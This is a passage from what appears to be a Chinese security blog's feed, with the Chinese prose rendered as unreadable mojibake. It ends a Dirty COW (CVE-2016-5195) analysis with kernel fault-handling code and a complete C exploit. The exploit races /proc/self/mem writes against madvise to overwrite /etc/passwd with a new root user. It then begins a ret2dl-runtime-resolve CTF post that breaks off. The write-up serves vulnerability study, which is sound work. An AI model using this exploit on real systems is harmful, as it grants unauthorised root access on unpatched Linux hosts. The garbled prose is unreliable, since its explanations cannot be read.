class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ¬¡è¿›å…¥æ—¶ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªå¯å†™çš„å†…å­˜é¡µäº†ï¼Œå¹¶ä¸”è¿”å›å€¼ä¸º<code>VM_FAULT_WRITE</code>ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œåˆ°ä¸Šé¢çš„æœ€åä¸€æ®µï¼Œæ‰€ä»¥ä¼šæ¸…é™¤æ‰<code>flag</code>ä¸­çš„<code>FOLL_WRITE</code>ã€‚é‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨<code>follow_page_pte</code>å‡½æ•°æ—¶åˆ™ä¼šè¿”å›æ­£å¸¸çš„å†…å­˜é¡µäº†ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨åˆ†æä¹‹å‰ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹<code>madvise</code>ç³»ç»Ÿè°ƒç”¨ï¼Œ<code>madvise</code>ä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºåœ°å€ï¼Œç¬¬äºŒå‚æ•°ä¸ºèŒƒå›´ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºè¡Œä¸ºã€‚è€Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯å»ºè®®å†…æ ¸ï¼Œåœ¨ä» addr æŒ‡å®šçš„åœ°å€å¼€å§‹ï¼Œé•¿åº¦ç­‰äº len å‚æ•°å€¼çš„èŒƒå›´å†…ï¼Œè¯¥åŒºåŸŸçš„ç”¨æˆ·è™šæ‹Ÿå†…å­˜åº”éµå¾ªç‰¹å®šçš„ä½¿ç”¨æ¨¡å¼ã€‚å†…æ ¸ä½¿ç”¨è¿™äº›ä¿¡æ¯ä¼˜åŒ–ä¸æŒ‡å®šèŒƒå›´å…³è”çš„èµ„æºçš„å¤„ç†å’Œç»´æŠ¤è¿‡ç¨‹ã€‚è€Œå…¶ä¸­å­˜åœ¨ä¸€ä¸ª<code>MADV_DONTNEED</code>å‚æ•°æˆ‘æ‰€ç†è§£çš„å°±æ˜¯å»é™¤å¯¹åº”çš„è¡¨é¡¹ï¼Œå¹¶ä¸”è¢«å†…æ ¸æ ‡è®°ï¼Œåœ¨è¢«éœ€è¦æ—¶å¯ä»¥è¢«é‡æ–°ä½¿ç”¨ã€‚</p><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">pte_unmap(page_table);</span><br><span class="line"><span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line"><span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¬¡èšç„¦<code>do_fault</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€æ¬¡æˆ‘ä»¬çš„flagså…¶å®æ˜¯æ²¡æœ‰<code>FAULT_FLAG_WRITE</code>æ ‡å¿—ä½çš„ï¼Œæ‰€ä»¥ä¼šç›´æ¥è°ƒç”¨<code>do_read_fault</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_read_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span></span><br><span class="line"><span class="comment"> * if page by the offset is not ready to be mapped (cold cache or</span></span><br><span class="line"><span class="comment"> * something).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="number">1</span>) &#123;</span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">do_fault_around(vma, address, pte, pgoff, flags);</span><br><span class="line"><span class="keyword">if</span> (!pte_same(*pte, orig_pte))</span><br><span class="line"><span class="keyword">goto</span> unlock_out;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, <span class="literal">NULL</span>, &amp;fault_page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">do_set_pte(vma, address, fault_page, pte, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">unlock_out:</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„<code>do_set_pte(vma, address, fault_page, pte, false, false);</code>å‡½æ•°è°ƒç”¨ï¼Œåœ¨<code>do_cow_fault</code>å‡½æ•°ä¸­åŒæ ·å­˜åœ¨è¿™æ ·çš„è°ƒç”¨<code>do_set_pte(vma, address, new_page, pte, true, true);</code>ã€‚å¯ä»¥å‘ç°ç¬¬ä¸‰ä¸ªå‚æ•°ä¹Ÿå°±å†³å®šäº†åé¢å¯ä»¥è·å–åˆ°çš„é¡µé¢ï¼Œè€Œ<code>do_read_fault</code>è¿™é‡Œè·å–çš„ç›´æ¥å°±æ˜¯<code>fault_page</code>ï¼Œè¿™é‡Œå°±æ˜¯å¾ˆç®€å•ç²—æš´çš„å°†å…¶ç§»å‡º<code>page_cache</code>ï¼Œè¿™æ˜¯å› ä¸ºkernelåœ¨é¢å¯¹ä¸€ä¸ªè¯»è¯·æ±‚æ—¶ä¸ä¼šå¤§è´¹å‘¨ç« çš„å†å»åˆ›å»ºä¸€ä¸ª<code>dirty COW</code>é¡µã€‚</p><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>ä½¿ç”¨ä¸¤ä¸ªçº¿ç¨‹è·‘ç«äº‰ï¼Œåœ¨ç¬¬ä¸€ä¸ªçº¿ç¨‹å®Œæˆä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸çš„æµç¨‹ä¹‹åï¼Œç¬¬äºŒä¸ªçº¿ç¨‹è°ƒç”¨<code>madvise()</code>ç³»ç»Ÿè°ƒç”¨å°†å†…å­˜é¡µè°ƒå‡ºï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªçº¿ç¨‹åœ¨å°è¯•ç¬¬ä¸‰æ¬¡è·å–å†…å­˜é¡µæ—¶ä¾¿æ— æ³•æ­£å¸¸è·å–åˆ°å¯è¯»çš„ç‰©ç†é¡µï¼Œæ­¤æ—¶ä¼šå†æ¬¡å‡ºå‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ¥ä¸‹æ¥ä¼šæœ‰ä¸€æ¬¡è¿›å…¥åˆ°<code>faultin_page()</code>å‡½æ•°ä¸­ï¼Œè€Œè¿™æ¬¡è¿”å›çš„å†…å­˜é¡µå…¶å®å°±æ˜¯<code>fault_page</code>ï¼Œå¹¶ä¸”è¿™ä¸ªå†…å­˜é¡µä¹Ÿæ˜¯ä¸å¯å†™çŠ¶æ€çš„ï¼Œä½†æ˜¯åœ¨ä¸Šé¢çš„flagä¸­ï¼Œæˆ‘ä»¬å·²ç»å»é™¤æ‰äº†<code>FOLL_WRITE</code>æ‰€ä»¥åœ¨å†…æ ¸çœ¼ä¸­ï¼Œè¿™æ˜¯ä¸€å—ç”¨æ¥è¯»çš„å†…å­˜é¡µï¼Œæ‰€ä»¥ä¼šæ­£å¸¸è¿”å›å¤„å†…å­˜é¡µï¼Œä½†æ˜¯åœ¨<code>access_remote_vm</code>ä¸­åˆ¤æ–­è¯»å†™ä½¿ç”¨çš„æ˜¯<code>write</code>å˜é‡ï¼Œæ‰€ä»¥å®é™…ä¸Šæˆ‘ä»¬ä¾æ—§æ˜¯åœ¨å¾€å†…éƒ¨è¿›è¡Œå†™ï¼Œè‡³æ­¤æˆåŠŸå®ç°äº†è¶Šæƒå†™ã€‚</p><h2 id="ç»¼ä¸Šï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šï¼Œå¯å¾—exp"></a>ç»¼ä¸Šï¼Œå¯å¾—exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">passwd_st</span>;</span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">char</span> *fake_user;</span><br><span class="line"><span class="keyword">int</span> fake_user_length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *username;</span><br><span class="line">    <span class="keyword">char</span> *hash;</span><br><span class="line">    <span class="keyword">int</span> user_id;</span><br><span class="line">    <span class="keyword">int</span> group_id;</span><br><span class="line">    <span class="keyword">char</span> *info;</span><br><span class="line">    <span class="keyword">char</span> *home_dir;</span><br><span class="line">    <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">info</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .user_id = <span class="number">0</span>,</span><br><span class="line">        .group_id = <span class="number">0</span>,</span><br><span class="line">        .info = <span class="string">&quot;196082&quot;</span>,</span><br><span class="line">        .home_dir = <span class="string">&quot;/root&quot;</span>,</span><br><span class="line">        .shell = <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="keyword">off_t</span>)<span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_user, fake_user_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passwd_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./dirty username password&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do not forget to make a backup for the /etc/passwd by yourself&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info.username = argv[<span class="number">1</span>];</span><br><span class="line">    info.hash = crypt(argv[<span class="number">2</span>], argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fake_user_length = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">                                info.username,</span><br><span class="line">                                info.hash,</span><br><span class="line">                                info.user_id,</span><br><span class="line">                                info.group_id,</span><br><span class="line">                                info.info,</span><br><span class="line">                                info.home_dir,</span><br><span class="line">                                info.shell);</span><br><span class="line">    fake_user = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(fake_user_length + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(fake_user, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">            info.username,</span><br><span class="line">            info.hash,</span><br><span class="line">            info.user_id,</span><br><span class="line">            info.group_id,</span><br><span class="line">            info.info,</span><br><span class="line">            info.home_dir,</span><br><span class="line">            info.shell);</span><br><span class="line"></span><br><span class="line">    passwd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of /etc/passwd: %d\n&quot;</span>, passwd_fd);</span><br><span class="line"></span><br><span class="line">    fstat(passwd_fd, &amp;passwd_st);</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/" >https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v4.4/source" >https://elixir.bootlin.com/linux/v4.4/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;CVE-2016-5195å°±æ˜¯éå¸¸å‡ºåçš„&lt;code&gt;Dirty COW&lt;/code&gt;ï¼Œä¿—ç§°&lt;code&gt;è„ç‰›æ¼æ´&lt;/code&gt;ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVEå¤ç°" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="page fault" scheme="https://196082.github.io/tags/page-fault/"/>
    
    <category term="COW" scheme="https://196082.github.io/tags/COW/"/>
    
    <category term="Race condition" scheme="https://196082.github.io/tags/Race-condition/"/>
    
  </entry>
  
  <entry>
    <title>dl-runtime-resolveé‡æ¸©</title>
    <link href="https://196082.github.io/2023/07/28/dl-runtime-resolve/"/>
    <id>https://196082.github.io/2023/07/28/dl-runtime-resolve/</id>
    <published>2023-07-28T14:27:42.000Z</published>
    <updated>2023-10-27T08:39:07.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨å…ˆå‰å…¶å®æˆ‘å·²ç»å†™è¿‡ä¸€ç¯‡<a class="link"   href="https://cv196082.gitee.io/2022/02/03/ret2dl-runtime-resolve/" >ret2dl-runtime-resolve<i class="fas fa-external-link-alt"></i></a>äº†ã€‚ä¸è¿‡åœ¨é‚£ç¯‡æ–‡ç« ä¸­å¹¶æ²¡æœ‰æåˆ°å½“<code>RELRO</code>çš„ç­‰çº§ä¸º<code>FULL</code>çš„æƒ…å†µä¸‹è¯¥å¦‚ä½•è¿›è¡Œåˆ©ç”¨æ–¹æ³•ã€‚åˆå› ä¸ºè¿™ç±»é¢˜ç›®ä¸€èˆ¬æ¥è¯´å°±æ˜¯æ¨¡æ¿é¢˜ç›®çš„ç¼˜æ•…æ‰€ä»¥æˆ‘ä¹Ÿå°±ä¸€ç›´æ²¡æœ‰æ”¾åœ¨å¿ƒä¸Šï¼Œç›´åˆ°è¿™ä¸€æ¬¡å·…å³°æå®¢é‡åˆ°äº†è¿™æ ·ä¸€é“é¢˜ç›®ã€‚äº‹å…ˆéœ€è¦æåˆ°çš„æ˜¯ï¼Œè¿™é“é¢˜å…¶å®æ˜¯å…·æœ‰æ›´ç®€å•çš„è§£é¢˜æ–¹æ³•çš„ï¼Œé‚£å°±æ˜¯å°†gotè¡¨ä¸­readçš„å‡½æ•°åœ°å€å†™åˆ°bssä¸­ï¼Œéšåä¿®æ”¹ä¾¿å®œç›´æ¥è°ƒç”¨syscallå³å¯ã€‚ä¸è¿‡æ—¢ç„¶å–åå«<code>link_map</code>ä¹Ÿå¯¼è‡´æˆ‘å¤´é“åˆ°ä¸€ç›´å°è¯•<code>_dl_runtime_resolve</code>çš„æ–¹å¼å»è§£å†³ï¼Œæ‰€ä»¥åç»­çš„é¢˜ç›®éƒ½æ²¡çœ‹ã€‚</p><p>å› ä¸ºå†…æ ¸ç©çš„æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥ä¸‹æ¥çœ‹äº†é‚£ä¸€é“å†…æ ¸é¢˜ï¼Œé¢˜ç›®ç»™çš„é©±åŠ¨æ˜¯æ²¡æœ‰æ¼æ´çš„ï¼Œä½†æ˜¯å› ä¸ºæ²¡æœ‰åŠ ä»»ä½•é”çš„ç¼˜æ•…å¹¶ä¸”å†…æ ¸ç‰ˆæœ¬ä¸º5.10.xæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨<a class="link"   href="https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/" >å †å ä½æŠ€æœ¯<i class="fas fa-external-link-alt"></i></a>ç›´æ¥é€ æˆUAFï¼Œè¿˜ç®—æ˜¯æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥ä¸ä¼šå•ç‹¬å†™æ–‡ç« è¿›è¡Œå¤ç°ã€‚</p><h2 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h2><h3 id="Fullå’ŒPartialçš„åŒºåˆ«"><a href="#Fullå’ŒPartialçš„åŒºåˆ«" class="headerlink" title="Fullå’ŒPartialçš„åŒºåˆ«"></a>Fullå’ŒPartialçš„åŒºåˆ«</h3><p>é¦–å…ˆæœ€ç›´æ¥çš„åŒºåˆ«å°±æ˜¯åœ¨Fullçš„æƒ…å†µä¸‹gotè¡¨æ˜¯ä¸å¯å†™çš„ï¼Œå¹¶ä¸”æ‰€æœ‰ç¬¦å·çš„åœ¨åœ¨å¼€å§‹æ—¶å°±ä¼šè¢«è§£æï¼Œ<code>.got.plt</code>æ®µä¼šè¢«å®Œå…¨åˆå§‹åŒ–ä¸ºç›®æ ‡å‡½æ•°çš„æœ€ç»ˆåœ°å€ã€‚è¿™ä¹Ÿå°±å¯¼è‡´<code>link_map</code>å’Œ<code>_dl_runtime_resolve</code>ä¸ä¼šè¢«åŠ è½½ã€‚æ‰€ä»¥é¦–å…ˆéœ€è¦çš„å°±æ˜¯æ³„æ¼å‡º<code>link_map</code>å’Œ<code>_dl_runtime_resolve</code>å‡½æ•°ã€‚</p><h3 id="åˆ©ç”¨çš„å¿…è¦æ¡ä»¶"><a href="#åˆ©ç”¨çš„å¿…è¦æ¡ä»¶" class="headerlink" title="åˆ©ç”¨çš„å¿…è¦æ¡ä»¶"></a>åˆ©ç”¨çš„å¿…è¦æ¡ä»¶</h3><p>ä¸€ã€æ ˆæº¢å‡º</p><p>äºŒã€å­˜åœ¨ä¸€ä¸ªä»»æ„åœ°å€è¯»å–å¹¶ä¸”èƒ½å†™åˆ°ä»»æ„åœ°å€</p><p>å…¶å®æœ‰äº†å¦‚ä¸Šæ¡ä»¶ä¹‹åä¾æ—§å¯ä»¥é€‰æ‹©çš„æ›´ç®€å•çš„æ–¹å¼å°±æ˜¯è¯»å–gotè¡¨ä¸­<code>read</code>å‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”è¿›è¡Œ<code>partial write</code>ä½¿å…¶æœ€ç»ˆæŒ‡å‘<code>syscall</code>ã€‚</p><h3 id="è·å–link-map"><a href="#è·å–link-map" class="headerlink" title="è·å–link_map"></a>è·å–link_map</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 